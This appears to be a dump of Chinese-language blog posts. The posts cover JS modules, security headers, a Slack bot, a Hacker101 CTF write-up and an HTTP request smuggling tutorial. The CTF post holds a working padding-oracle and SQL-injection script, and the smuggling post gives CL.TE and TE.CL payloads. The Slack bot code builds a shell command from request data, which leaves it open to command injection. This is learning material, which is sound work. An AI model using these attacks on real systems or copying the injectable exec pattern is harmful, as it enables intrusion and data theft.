這裡可以處理一些初始化的東西 return { click: () =&gt; { console.log('Hi') } }}// b.js// 第一種const a = require('./a.js')()a.click()// Hi// 第二種const {click} = require('./a.js')()click()// Hi 接下來就用不同種例子，看看使用方式 1234567// a.jsmodule.exports = [1, 2, 3]// b.jsconst a = require('./a.js')console.log(a)// [1, 2, 3] 123456789// a.jsmodule.exports = { name: 'Hi'}// b.jsconst a = require('./a.js')console.log(a.name);// Hi ECMA6我把上面的例子轉換成 ECMA6 import 和 export 的方式但是有些地方會有些許不同 1234567891011// a.jsexport default { click: () =&gt; { console.log('Hi') }}// b.jsimport a from './a.js'a.click()// Hi 123456789101112// a.jsconst click = () =&gt; { console.log('Hi')}export { click}// b.jsimport {click} from './a.js'click()// Hi 也可以搭配 as 和 * 去做 import (無法跟 export default 做搭配) 123456789101112// a.jsconst click = () =&gt; { console.log('Hi')}export { click}// b.jsimport * as a from './a.js'a.click()// Hi 接下來就用不同種例子，看看使用方式 1234567// a.jsexport default [1, 2, 3]// b.jsimport a from './a.js'console.log(a);// [1, 2, 3] 12345678910// a.jsconst a = [1, 2, 3]export { a}// b.jsimport {a} from './a.js'console.log(a);// [1, 2, 3] 1234567891011121314// a.jsexport default { name: 'hi'}// 等同於const a = { name: 'hi'}export default a// b.jsimport a from './a.js'console.log(a.name);// Hi","link":"/2017/10/19/module-export/"},{"title":"增加安全性的 HTTP Headers","text":"最近遇到需要增進網站安全性的問題於是 survey 了幾個常見的 header 設置方式接下來會開始介紹每一個 header 的功能以及設置方式以及可以到這個網站進行檢測 https://securityheaders.io/個人習慣是用 nodejs + express，所以以下使用方式都會是以 express 為主 Set-Cookie 設置方式防禦面向為: XSS Set-Cookie 基本上是最多人使用的，但是 Set-Cookie 的設置方式如果沒有設定好是不安全的Set-Cookie 有以下兩個 header 可以設定 HttpOnly設置 HttpOnly 的 cookie 之後，會沒辦法用 document.cookie 的方式(任何 javascript)去存取 cookie Secure強制 cookie 只能在 HTTPS protocol 的環境下進行傳遞簡單來說設置 Secure 的 cookie 之後在非 HTTPS 的環境底下是會失效的 使用方式1234res.cookie('cookie_name', 'jack', { httpOnly: true, secure: true}) X-XSS-Protection防禦面向為: XSS 設定之後，如果瀏覽器偵測到 XSS 的攻擊，會根據設置的屬性做不同的反應p.s. 這個是舊有的屬性，基本上可以被 Content-Security-Policy 取代但是還是可以為那些沒有支援 Content-Security-Policy 的瀏覽器提供一層保護 X-XSS-Protection 有以下四個值可以設定 0關閉 XSS 過濾功能 1開啟 XSS 過濾功能，如果偵測到 XSS 攻擊的話，瀏覽器會刪除不安全的部分 1; mode=block開啟 XSS 過濾功能，如果偵測到 XSS 攻擊的話，瀏覽器不會把網頁給渲染出來 1;report= (Chromium only)開啟 XSS 過濾功能，如果偵測到 XSS 攻擊的話，瀏覽器會回報到指定的 URI 使用方式1234res.setHeader('X-XSS-Protection', '0')res.setHeader('X-XSS-Protection', '1')res.setHeader('X-XSS-Protection', '1; mode=block')res.setHeader('X-XSS-Protection', '1;report=https://www.example.com') Content-Security-Policy防禦面向為: XSS Content-Security-Policy 是一個可以限制網站的 script object style font 的來源主要是用白名單的方式限制，甚至可以限制不允許 eval 這種東西出現簡單來說設定 Content-Security-Policy 之後，只有白名單內的 resource 可以存取因為值很多種，所以以下用例子來解釋，詳細可以參考 Content-Security-Policy但基本上有以下幾種可以設定 default-src script-src img-src font-src frame-src 1res.setHeader('Content-Security-Policy', \"default-src 'self'; script-src 'self' *.google.com 'unsafe-eval'; img-src 'self' *.amazonaws.com data:\") 以上面的例子來說default-src ‘self’ 代表網站 resource 只能讀取自己網站的，default 代表如果在其他設置欄位沒找到的話，會根據 default-src 為主script-src ‘self’ .google.com ‘unsafe-eval’ 代表我用的 script src 可以存取自己網站以及 .google.com 底下，以及可以允許 evalimg-src ‘self’ .amazonaws.com data:代表我用的 script src 可以存取自己網站以及 .amazonaws.com 底下，以及比較特別的是可以存取 base64 格式的 image data X-Frame-Options防禦面向為: Clickjacking X-Frame-Options 主要是設定網站是否能被其他網站透過 iframe frame 的方式遷入X-Frame-Options 有以下三個值可以設定 DENY不允許被任何網站用 iframe 的形式嵌入的假設在 www.example.com 設置了 X-Frame-Options: DENY 的話在 www.google.com 的話，是不能 html 裡面嵌入 &lt;iframe src=&quot;www.example.com&quot;&gt;&lt;/iframe&gt; SAMEORIGIN允許同源底下的網站，用 iframe 方式嵌入 ALLOW-FROM設定白名單的 list 使用方式123res.setHeader('X-Frame-Options', 'DENY')res.setHeader('X-Frame-Options', 'SAMEORIGIN')res.setHeader('X-Frame-Options', 'ALLOW-FROM https://example.com') X-Content-Type-Options用途: 避免瀏覽器誤判文件形態 X-Content-Type-Options 是拿來防止 Content-Type 被竄改比較要注意的是，這個屬性只會套用在 script style如果 style 的 content-type 不是 text/css 就會被拒絕如果 script 的 content-type 不是 javascript MIME type 就會被拒絕 使用方式1res.setHeader('X-Content-Type-Options', 'nosniff') Strict-Transport-Security防禦面向: 強迫用戶使用 HTTPS，防範 MITM 攻擊 Strict-Transport-Security 是強化 HTTPS 機智的一種方式設置之後，即使是用 HTTP 連線，還是會被轉去使用 HTTPS 連線 使用方式1res.setHeader('Strict-Transport-Security', 'max-age=16070400; includeSubDomains') Referrer-Policy防禦面向: 增加隱私權 Referrer 代表的是你從 A 網站跳到 B 網站的時候，這個欄位會被記錄為 A簡單來說，他是記錄你上一個瀏覽的地方的東西 他有以下幾個值可以設定，詳細可以參考這裏 no-referrer不允許被記錄下來 origin只有紀錄 origin，例如在 https://example.com/a.html 底下，只會傳送 https://example.com strict-origin只有在 HTTPS-&gt;HTTPS 之間才會被記錄下來 no-referrer-when-downgrade (default)跟 strict-origin 一樣 origin-when-cross-origin只有在 CORS 的時候, referrer 才會被送出，但只有 origin same-originCORS 的時候, referrer 不會被記錄，同源的時候會有 origin strict-origin-when-cross-origin只有在同源的時候才會送出 referrer，而且還是要 HTTPS -&gt; HTTPS unsafe-url不管怎樣都送就對拉 使用方式12res.setHeader('Referrer-Policy', 'no-referrer')res.setHeader('Referrer-Policy', 'unsafe-url') Public-Key-Pins防禦面向: 中間人攻擊 設定 Public-Key-Pins 之後，可以給予我們是否要主動信任 CA (憑證頒發機構) 的權利可以防止攻擊者透過 CA 錯誤的簽署憑證並進行中間人攻擊的安全機制 使用方式1234// 裡面的 base64== 是要透過用自己的憑證，產出的 public keu// 產出的 public key 配合 openssl 產出 fingerprint// 把 fingerprint 貼上來取代掉 base64== 即可res.setHeader('Public-Key-Pins', 'pin-sha256=\"base64==\"; max-age=2592000; includeSubDomains') Referencehttps://developer.mozilla.orghttps://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/","link":"/2017/10/20/secure-header/"},{"title":"Slack Bot","text":"在開始玩弄 Slack Bot 之前，必須要先去申請頁面建立一個 APP 申請完之後，可以看到 Features 那邊有很多不同的功能這次主要會針對 Slash Command、Incoming Webhooks 以及 Interactive Components 做練習 在開始正式介紹之前，我們可以思考一個情境身為工程師，就是會想要降低人工干涉的事情，大量自動化那今天，我想要自動部署我的 server 的話，可以怎麼做呢? 這裡可以透過 Slash Command + Incoming Webhooks 做到，步驟如下 在 Slack 上面打上 /deploy ticket master (用 Slash Command 通知 server) Server 就會接收到需要 deploy tickey server，然後切換到 master branch 上面 pull 最新版本之後，完成此次更新 通知公司同仁，更新已結束 (用 Incoming Webhooks 通知) 這流程就會是我們所想要的，當然中間還可以透過 jenkins 去部署其他台伺服器用 slack 部署 server，超方便 der (但感覺拿來訂便當更好用 XD Slash Command介紹Slash Command 就是在 Slack 的聊天室下指令，例如1/deploy server就會觸發到遠端伺服器，伺服器解析 command 後，再去近一步做一些行為 建立新指令下圖就是設定 Slash Command 的地方我們設定了 command 為 /test，然後會用 POST 觸發到遠端的 https://your.website.com/test 比較重要的地方是，Request URL 一定要是 HTTPS，如果不是 HTTPS 一律拒絕，在 Slack 官方文件上面有以下這段說明 NOTE: If your Slack app is set to be distributable or is part of the Slack app directory, the URL you provide must be use HTTPS with a valid, verifiable SSL certificate. Self-signed certificates cannot be used. See below for more information. 按下 Save 之後，回到頁面會看到，就代表建立完成了 安裝進到你的 team按下 Install App to Workspace，就會到授權頁面，然後點下 Authorize 即可安裝完成 安裝後在 channel 會出現訊息，通知說已經把 App 加入進來了 這時候在聊天室裡面打下 /test 會出現我剛剛建立的 command 和 Description不過輸入之後，並不會有任何反應，原因是因為我們還沒有設置好伺服器端的設定 開始寫程式去接受 slash command這邊用 nodejs 示範建立一個簡單的伺服器去接受 slash command SSL 的建立容許我這邊就不做示範了 XD (有點麻煩 123456789101112131415161718const express = require('express');const app = express();const bodyParser = require('body-parser');app.use(bodyParser.json());app.use(bodyParser.urlencoded({ extended: false}));app.post('/test', (req, res, next) =&gt; { console.log(req.body); console.log(`User : ${req.body.user_name}`); console.log(`Text : ${req.body.text}`); console.log(`Command : ${req.body.command}`); return res.json({ text: 'Command is successful' })})app.listen(8080) 在輸入視窗輸入以下指令後 1/test Hi I'm from slack 伺服器端會得到 完整的 JSON 格式如下1234567891011121314// 敏感資訊我都以 X 先馬掉了{ token: 'XXXXXXXXXXXXXXXXXXXXXXX', team_id: 'XXXXXXXXX', team_domain: 'XXXXXX', channel_id: 'XXXXXXXXX', channel_name: 'announcement', user_id: 'XXXXXXXXX', user_name: 'yujack', command: '/test', text: 'Hi I\\'m from slack', response_url: 'XXXXXXXXXXXXXX', trigger_id: 'XXXXXXXXXXXXXX' } 而在輸入窗那邊會看到 代表指令有成功到伺服器上面了，然後回傳一個 “Command is successful”指令完成後，一定會想問一個問題 『我想要通知其他人，我觸發了這個指令，我不想要只有我看到，那我該怎麼做？』 這時候就是下一個功能 Incoming Webhooks Incoming Webhooks介紹Incoming Webhook，可以直接讓你用 curl 的方式去發訊息到某一個 chaneel 裡面 啟用啟用 Incoming Webhooks 功能 啟用之後，會在下面看到一個範例，還有新增 Webhook 的地方 點選 “Add New Webhook to Workspace”，會到授權頁面這裡會出現，你想要把訊息可以傳送到哪一個地方那這裡我就選擇 general 作為範例 使用在 terminal 貼上以下指令 1curl -X POST -H 'Content-type: application/json' --data '{\"text\":\"Hello, World!\"}' https://hooks.slack.com/services/XXXXXXXX 在你設定要傳送的那個 channel 就會出現訊息了 那有了這個 Webhooks 之後，剛剛的 nodejs server 就可以稍微做更改這樣的話就可以告訴那一個 channel 的人說，你執行了什麼樣的指令 ~ 12345678910111213141516171819202122232425262728293031const express = require('express');const app = express();const bodyParser = require('body-parser');app.use(bodyParser.json());app.use(bodyParser.urlencoded({ extended: false}));app.post('/test', (req, res, next) =&gt; { console.log(req.body); console.log(`User : ${req.body.user_name}`); console.log(`Text : ${req.body.text}`); console.log(`Command : ${req.body.command}`); const command = `curl -X POST ` + `-H 'Content-type: application/json' ` + `--data '${JSON.stringify(req.body.slack_message)}' ` + `https://hooks.slack.com/services/XXXXXXXXX`; exec(command, (error, stdout, stderr) =&gt; { if (error) { console.error(`exec error: ${error}`); return; } return res.json({ text: 'Command is successful' }) })})app.listen(8080) 到這裡不禁會想到一個問題，我能不能不把 branch 記起來我直接讓 server 告訴我，我在選一個我想要的去 deploy 呢? 這時候，Interactive Components 就派上用場了這個功能可以接收使用者選擇了什麼選項，然後進一步去分析接下來就要介紹 Interactive Components Interactive Components介紹這是一個互動式的功能，在 Slack 上面可能會跳出 Message Button : 例如是否同意這個意見? Menus : 例如訂 A 便當 or B 便當? Dialogs : 例如通知? 當使用者點選了某一個按鈕或是選擇了其中一個選項就會 post 到 server 上，跟 server 說使用者做了什麼選擇學會 Interactive Componet 之後，我們自動化流程就可以改成 在 Slack 上打 /show ticket (用 Slash Command 通知 server) Server 回傳 ticket server 所有的 branch (用 Incoming Webhooks 通知) 使用者點選其中一個 branch 進行 deploy (用 Interactive Components 接收使用者點選哪一個 branch) Server 就會接收到需要 deploy tickey server，然後切換到 master branch 上面 pull 最新版本之後，完成此次更新 通知公司同仁，更新已結束 (用 Incoming Webhooks 通知) 啟用 使用在使用 Interactive Componets 之前，要先學會如何製作選項或是按鈕給使用者點選Slack 官方有提供地方可以客製化不同的按鈕或是表單的地方，點這進去我客製化了這個訊息 123456789101112131415{ \"text\": \"Would you like to play a game?\", \"attachments\": [{ \"text\": \"Choose a game to play\", \"fallback\": \"You are unable to choose a game\", \"callback_id\": \"wopr_game\", \"attachment_type\": \"default\", \"actions\": [{ \"name\": \"game\", \"text\": \"Chess\", \"type\": \"button\", \"value\": \"chess\" }] }]} 拿到訊息之後，利用 Incoming Webhooks 送出到使用者端給使用者點選 點選之後伺服器會發 POST 到 https://your.website.com/interactive伺服器就會收到以下資訊 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// Before JSON.Parse{ payload: '{\"actions\":[{\"name\":\"game\",\"type\":\"button\",\"value\":\"chess\"}],\"callback_id\":\"wopr_game\",\"team\":{\"id\":\"XXXXXXXXX\",\"domain\":\"XXXXXX\"},\"channel\":{\"id\":\"XXXXXXXXX\",\"name\":\"general\"},\"user\":{\"id\":\"XXXXXXXXX\",\"name\":\"yujack\"},\"action_ts\":\"1507970582.644321\",\"message_ts\":\"1507970575.000002\",\"attachment_id\":\"1\",\"token\":\"XXXXXXXXXXXXXXXXXXXXXXX\",\"is_app_unfurl\":false,\"type\":\"interactive_message\",\"original_message\":{\"text\":\"Would you like to play a game?\",\"bot_id\":\"XXXXXXXXX\",\"attachments\":[{\"callback_id\":\"wopr_game\",\"fallback\":\"You are unable to choose a game\",\"text\":\"Choose a game to play\",\"id\":1,\"actions\":[{\"id\":\"1\",\"name\":\"game\",\"text\":\"Chess\",\"type\":\"button\",\"value\":\"chess\",\"style\":\"\"}]}],\"type\":\"message\",\"subtype\":\"bot_message\",\"ts\":\"1507970575.000002\"},\"response_url\":\"https:\\\\/\\\\/hooks.slack.com\\\\/actions\\\\/XXXXXXXXX\\\\/XXXXXXXXX\\\\/XXXXXXXXXXXXXXXXXXXXXXXXX\",\"trigger_id\":\"XXXXXXXXX.XXXXXXXXX.XXXXXXXXXXXXXXXXXX\"}'}// After JSON.parse{ payload: { actions: [{ name: 'game', type: 'button', value: 'chess' }], callback_id: 'wopr_game', team: { id: 'XXXXXXXXX', domain: 'XXXXXX' }, channel: { id: 'XXXXXXXXX', name: 'general' }, user: { id: 'XXXXXXXXX', name: 'yujack' }, action_ts: '1507970582.644321', message_ts: '1507970575.000002', attachment_id: '1', token: 'XXXXXXXXXXXXXXXXXXXXXXX', is_app_unfurl: false, type: 'interactive_message', original_message: { text: 'Would you like to play a game?', bot_id: 'XXXXXXXXX', attachments: [ [Object] ], type: 'message', subtype: 'bot_message', ts: '1507970575.000002' }, response_url: 'https://hooks.slack.com/actions/XXXXXXXXX/XXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXX', trigger_id: 'XXXXXXXXX.XXXXXXXXX.XXXXXXXXXXXXXXXXXX' }} 按鈕會消失，然後顯示你在 server 上面回傳的完成資訊收到資訊之後，就可以知道使用者點選了什麼按鈕或是選擇了什麼選項根據這些選項伺服器在做一些處理就可以完成了 伺服器上面的程式會長這樣 (這邊單純印出來而已，沒有做後續處理 123456app.post('/interactive', (req, res, next) =&gt; { console.log(req.body); return res.json({ text: 'Command is successful' })}) 結論我用了一個情境讓大家比較好思考如何把這三個功能串起來雖然我還是覺得用在訂便當上面很方便就是了 (? 不過有些細部關於真正如何部署或是 SSL 的部分這裡就不會說明了那個會需要花到一兩篇文章的篇幅去介紹 如果有任何問題，請歡迎一起來討論 ~","link":"/2017/10/14/Slack-Bot/"},{"title":"Hacker 101 CTF Write Up Part 6 - Encrypted Pastebin (Padding Oracle 以及翻轉攻擊)","text":"Encrypted Pastebin這題總共有四個 flag 0x00一開始畫面長這樣 試著輸入值之後，發現上面有一段 ?post= 資料 嘗試更改之後，發現 flag 0x01根據上一個 error message 得知有用到 base64所以可以知道 ?post= 的是 base64接下來再輸入一些奇怪的值試試看 發現程式使用的是 aes-128-cbc 去把資料作加密且根據錯誤訊息表示 IV 要為 16 bytes，代表 post 是需要帶入 IV 進去的那根據這篇解釋 aes 加解密以及存在的 padding oracle 攻擊得知透過修改 iv 可以對解密後的資料做 XOR，進而達到目標 payload主要公式如下:12345678// new_iv 為攻擊者構造的 iv// iv 為原本的 iv// plain 為明文// middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload公式 1: plain[i] = middle[i] XOR iv[i]公式 2: 0x01 = middle[i] XOR new_iv[i]公式 3: middle[i] = 0x01 XOR new_iv[i]公式 4: plain[i]= 0x01 XOR new_iv[i] XOR iv[i]透過以上公式可以推斷出明文，這邊用 16bytes 去排版，方便後續說明123456789{&quot;flag&quot;: &quot;^FLAG^a38f2d9e2659df7212c341bc01a2cf828c7d663978eb476ac6d664a03f49c08c$FLAG$&quot;, &quot;id&quot;: &quot;3&quot;, &quot;key&quot;: &quot;rTU2s8qRJ4uRRdLFJbt-YA~~&quot;}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n 0x02因為上一題有發現 id 為 3於是開始繼續利用上一個 flag 提到的文章裡面的翻轉攻擊去修改解密後的明文123456789// new_iv 為攻擊者構造的 iv// iv 為原本的 iv// plain 為明文// middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload// 'x' 為我們想要把解密後的值透過 xor 後變成的結果公式 1: plain[i] = middle[i] XOR iv[i]公式 2: 'x' = middle[i] XOR new_iv[i]公式 3: 'x' XOR new_iv[i] XOR iv[i] = plain[i]公式 4: new_iv[i] = plain[i] XOR 'x' XOR iv[i] 透過上面公式可以去修改原本的 payload這裡我們先只拿第一段來做修改，先省略掉其他 payload123456原本 iv: 05694ed4efacf438e310a4fc54ff2826原本明文: {&quot;flag&quot;: &quot;^FLAG^預期明文: {&quot;id&quot;: &quot;1&quot;}\\x05\\x05\\x05\\x05\\x05 (記得不夠是要 padding value)原本的值: 05694ed4efacf438e310a4fc54ff28265a813ad8376339531ea70324a0ce85c8更改後的: 056941dcacf1f620f21087bf1dbb6a7d5a813ad8376339531ea70324a0ce85c8上面可以發現前面 32 bytes 的 iv 已經變了把這個 payload 塞回去得到下面得結果 果然 QQ，原本以為還是要有 key 才能去解開，不能只單純改 id因為原本 id 在第 7 個 block所以改了第 6 個的 block，讓 id 所在的 block 從 3 -&gt; 1但改了第 6 個的 block，解密出來一定會有問題所以要先知道改了第 6 個 block 後的明文，再去回推第 5 個 block 應該要什麼值才能讓更改後的第 6 個 block XOR 後才能解回原本應有的值以此類推，要更改到最面的 iv block 才算完成但全部改完之後出現下面訊息，看來跟上面直接改 id 是一樣的\b看來 key 是拿去做進一層解密內容使用，所以直接改 id 不需要 key 就可以了，有點白做了 XD 0x03這一題試著把 id 改成單引號發生一件事情SQL Injection 出現了, 所以就需要把 payload 改成 SQL Injection 用的至於為什麼要用 SQL Injection 的原因是因為前一個 flag 只有顯示 title，但內容因為 key 問題所以沒有顯示出來所以只能透過 SQL Injection 去 dump 出資料庫看看有什麼可以幫助解開前一個 flag 的內容大概是長下面的樣子，透過替換掉前面的 FLAG 達到更換 id 以及保留 key 的值123456789{&quot;id&quot;: &quot;9 union all select database(),user()&quot;, &quot;aa&quot;: &quot;xxxxxxxxxxc6d664a03f49c08c$FLAG$&quot;, &quot;bb&quot;: &quot;3&quot;, &quot;key&quot;: &quot;rTU2s8qRJ4uRRdLFJbt-YA~~&quot;} 這樣就 dump 出 database 的資訊了(level3 以及 root@localhost 那個) 再來 dump 出 tables dump 出 columns 透過 dump 出來的 tables 和 columns，去把 tracking 列出資料來 發現有一筆資料是對 localhost 運行的結果把 post= 後面的值帶到瀏覽器後發現 flag4 (黑色大標是 flag3，下面小字為內容才是 flag4) 下面整理當時寫出來的 SQL Injection 搭配 Padding Oracle 程式碼 (有點亂 XD)程式基本邏輯為下: 透過 padding oracle 找到原本明文 透過翻轉攻擊構造假 iv 達到預期目標的明文 解完最右邊那一個 block 後，繼續慢慢往左邊一次解一個 block 解下去 要注意的地方是最外層的 for 迴圈一定要從第 9 個往下遞減跑下去每次跑完如果 request 量太多的導致中斷連線的話會顯示下一個要解的 block，以及下一個 payload 應該帶什麼，去防止中斷因為這邊是直接一次 call 256 的 request 去找比較快，所以很容易斷 XD最後面要注意的是 wantedPlainText 一定要是 16 bytes 唯一組才可以 想要直接使用這個程式碼的直接改兩個大點即可 originalPayload 的那一段 base64 改成正常 request 的 base64 把 http://34.74.105.127/548dbda597/?post= 改成你自己的即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596const getPayload = (paddingOracleValue, paddingValue, answer) =&gt; { answer.reverse() answer[paddingOracleValue] = paddingValue answer.reverse() return answer.toString('hex')}const setBlock = (allBlocks, targetBlock, paddingOracleValue, paddingValue, answer) =&gt; { const startPosition = targetBlock * 32; const previousBlockEndPosition = startPosition - 32; let first = allBlocks.substring(0, previousBlockEndPosition); let end = allBlocks.substring(startPosition); return first + getPayload(paddingOracleValue, paddingValue, answer) + end;}const encodeHexToBase64 = (payload) =&gt; { return Buffer.from(payload, 'hex').toString('base64').replace(/\\=/g, '~').replace(/\\//g, \"!\").replace(/\\+/g, \"-\")}const decodeBase64ToHex = (payload) =&gt; { return Buffer.from(payload.replace(/\\~/g, '=').replace(/\\!/g, \"/\").replace(/\\-/g, \"+\"), 'base64').toString('hex')}(async () =&gt; { const axios = require('axios'); // original let originalPayload = decodeBase64ToHex(\"H6KJsPhBWKtdEt3LZnTuf8K5!-B69-TxsTNIze9!0Wrss6wGzNUKwi-aaz8WfDVnBrb2UsO7tuAhRej9F05Fexm6MihRiLDQO1vNGPdAgGZAWo11!Mw1tAdnhvdOZra3gJ99qA1adxSD!s97jVbcizRIXZ!MHVKw4jVNAplCiqzYtXJNNhxCXsJIPRKDptSLgukPWBN!wEY2e1nCQPYVrQ~~\"); for (let i = 3; i &gt; 0; i--) { let block = i let plain = [] let plainText = []; let rawPayload = originalPayload.substring(0, (block + 1) * 32) let previousIv = originalPayload.substring((block - 1) * 32, (block) * 32) let answer = Buffer.from(\"00000000000000000000000000000000\", 'hex'); for (let paddingOracleValue = 0; paddingOracleValue &lt; 16; paddingOracleValue++) { let job = [] for (let index = 0; index &lt; 256; index++) { let paddingValue = index; let blocksToBeDecrypt = setBlock(rawPayload, block, paddingOracleValue, paddingValue, answer) payload = encodeHexToBase64(blocksToBeDecrypt) job.push(axios.get(`http://34.74.105.127/548dbda597/?post=${payload}`)) } let results = await Promise.all(job).catch((error) =&gt; { console.log(error) }) for (let index = 0; index &lt; results.length; index++) { let paddingValue = index; if (!results[index].data.includes('PaddingException')) { let originalIv = Buffer.from(rawPayload, 'hex') let tempPlainText = paddingValue ^ (paddingOracleValue + 1); plainText.push(tempPlainText); plain.unshift(Buffer.from([tempPlainText ^ originalIv[(block) * 16 - 1 - paddingOracleValue]]).toString('hex')) answer.reverse() let nextPaddingOracleValue = (paddingOracleValue + 2); for (let index = 0; index &lt; plainText.length; index++) { answer[index] = plainText[index] ^ nextPaddingOracleValue; } answer.reverse() console.log(plain); break; } } } const wantedPlainText = [ '{\"id\": \"9 union ', 'all select group', '_concat(headers)', ' ,2 FROM trackin', 'g\", \"b\": \"bbbbbb', 'bbbbbbbbbbbbbbbb', 'bbbbbbbbbbbbbbbb', 'bbb\", \"bbbbbb\":\"', 'YA~~\"}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n' ] const originalIv = Buffer.from(previousIv, 'hex') const change = plain.map(item =&gt; parseInt(item, 16)) console.log('old: ' + Buffer.from(change).toString()); console.log('new: ' + wantedPlainText[block - 1]); const originPlainText = Buffer.from(change) const wanttedPlainText = Buffer.from(wantedPlainText[block - 1]) const wanttedIv = [] for (let index = 0; index &lt; wanttedPlainText.length; index++) { wanttedIv.push(originalIv[index] ^ originPlainText[index] ^ wanttedPlainText[index]) } let newIv = Buffer.from(wanttedIv).toString('hex') let part1 = originalPayload.substring(0, (block - 1) * 32); let part3 = originalPayload.substring((block) * 32); originalPayload = `${part1}${newIv}${part3}` console.log(`replaced block: ${block}`); console.log(`next block: ${block - 1}`); console.log(`new payload: ${encodeHexToBase64(originalPayload)}`); } axios.get(`http://34.74.105.127/548dbda597/?post=${encodeHexToBase64(originalPayload)}`).then((response) =&gt; { console.log(response.data) })})(); 後記這題花了我很多時間解決 XD本來想說最後的 SQL Injection 就不要解了，反正大概知道怎麼弄但還是很想把它解出來，所以就還是想辦法透過程式自動化去找到最後的 flag只是過程中一直修改 wantedPlainText 再加上還會一直斷線真的是有夠麻煩 XD","link":"/2019/10/20/hacker101-part6/"},{"title":"HTTP Request Smuggling (HTTP 請求走私)","text":"什麼是 HTTP Request Smuggling ?今日常見的網頁應用程式往往會有多一層 server 的存在請求 –&gt; front-end server –&gt; back-end serverfront-end server 接收到請求的時候，會轉發到 back-end server 去處理 http request smuglling 的漏洞就是出現在『轉發』到 back-end server 這裏有時候為了效能關係，front-end server 到 back-end server 這一段會把所有請求塞在同一段 TCP Connection 裡面 (重複利用 TCP Connection)，如下圖 當所有請求集中在一起轉發到 back-end server 時如果在這之中有不合法的請求的話，會出現什麼樣的狀況呢？此不合法的請求會被當成『下一個』請求被 back-end server 處理這就是 HTTP Request Smuggling 攻擊 HTTP Request Smuggling 原理主要是透過 Content-Length 以及 Transfer-Encoding 此兩個標頭可以去構造出此攻擊，這邊複習一下這兩個標頭的意義 Content-LengthContent-Length 指的就是用 POST Method 時帶入的 data 的長度以此範例來說，總共為 11 bytes，那 Content-Length 就是 11(此長度不含 \\r\\n\\r\\n，詳細 HTTP 組成可參考此 HTTP/1.1 — 訊息格式 Message Format) 123456POST /search HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling Transfer-EncodingTransfer-Encoding 是為了解決上一個標頭 Content-Length 的問題而出現的另一個計算 message body 的方式詳細可以參考 HTTP 协议中的 Transfer-Encoding 這邊總共分為三個主體 1. 內容長度 (16 進位) 2. 主要內容 3. 結束 以下面的例子來說 1. 內容長度為: b 2. 內容為: q=smuggling 3. 結束: 0 第二點的內容是不包含 \\r\\n 的除非請求本身不是 POST，需要直接結束的話則需要把 \\r\\n 帶進去，且要計算長度 12345678POST /search HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0 而 HTTP 為了預防此兩個標頭同時使用所以當這兩個標頭同時出現的時候，會忽略 Content-Length 這個標頭再加上 front-end 和 back-end server 處理此兩個標頭的方式可能不一樣 代表說當以下情況出現時front-end 支援 Content-Length 但不支援 Transfer-Encodingback-end 支援 Content-Length 支援 Transfer-Encoding如果我同時送了兩個標頭過去的話，front-end 就只會處理 Content-Length 格式的內容而 back-end 就只會處理 Transfer-Encoding 格式的內容造成不一致的現象，這造成 HTTP Request Smuggling 漏洞的問題原因之一 反過來說front-end 支援 Content-Length 支援 Transfer-Encodingback-end 支援 Content-Length 但不支援 Transfer-Encoding也會造成不一致的現象，也是問題原因之一 上面兩個例子各代表為 CL.TE vulnerabilities 以及 TE.CL vulnerabilitiesCL = Content-LengthTE = Transfer-Encoding順序代表了 front-end.back-end，簡單來說就是看誰支援什麼 構造 HTTP Request SmugglingCL.TE基本請求的概念如下12345678POST / HTTP/1.1Host: xxxxxxxxContent-Length: 13Transfer-Encoding: chunked0SMUGGLED 因為前端支援 CL，所以就先用 CL 把要偷渡的請求先放在最下面並且用一個 0 放在前面代表著 TE 的結束符號當請求到 back-end 的時候POST 到 0 那一段就會是一個 reuqestSMUGGLED 那一段就會是下一個 request 這邊根據參考資料的網站去做一下實驗因為題目說要構造出 GPOST 到 back-end 處理 先試著對 front-end server 做 GPOST 得到此回應 接下來就是要把 GPOST 偷渡在 request 裡面送到 back-endPayload 為下:1234567891011POST / HTTP/1.1Host: xxxxxxxxContent-Length: 29Transfer-Encoding: chunked0GPOST /test HTTP/1.1---- 不包含此行 記得要有 \\r\\n 插在中間才代表 request 的結束不然會出現 timeout 或是 invalid request 的問題而在最後面的 GPOST 需要兩個 \\r\\n這樣的 Content-Length 計算是需要包含 \\r\\n\\r 一個 byte\\n 一個 byte 所以從 0 開始那一段0\\r\\n -&gt; 3 bytes\\r\\n -&gt; 2 byteGPOST /test HTTP/1.1\\r\\n -&gt; 22 bytes\\r\\n -&gt; 2 bytes總計為 29 bytes 第一次送 request 會得到正常的請求 第二次送，因為前一次 request 走私了一個 request所以 response 會回應到此次 request 上就得到 Unreconize GPOST Method 了 TE.CL基本請求的概念如下1234567891011POST / HTTP/1.1Host: xxxxxxxxContent-Length: 3Transfer-Encoding: chunked8SMUGGLED0---- 不包含此行 因為前端支援 TE，所以就先用 TE 把要偷渡的請求先放在最中間再微調 CL 的長度，讓 back-end 只處理到 TE 的第一個主體，這邊要注意是 CL 的設置，長度要設置到 TE 的第一個主體結尾 (包含 \\r\\n)以上面的例子來說，CL 長度要填到 8\\r\\n 為止 (3 bytes)後面就放要走私的請求即可 這邊根據參考資料的網站去做一下實驗第一個要注意的點是要偷渡的 request 長度GPOST /test HTTP/1.1\\r\\n -&gt; 22 bytes\\r\\n -&gt; 2 bytes24 bytes 轉成 16 進位變成 16 第二個要注意的點是 CL 長度為 416\\r\\n -&gt; 4 bytes 12345678910111213POST / HTTP/1.1Host: xxxxxxxxContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked16GPOST /test HTTP/1.10---- 不包含此行 第一次送 request 會得到正常的請求 第二次送，因為前一次 request 走私了一個 request所以 response 會回應到此次 request 上就得到 Unreconize GPOST Method 了 TE.TE還有一種是利用 front-end 和 back-end 對 TE 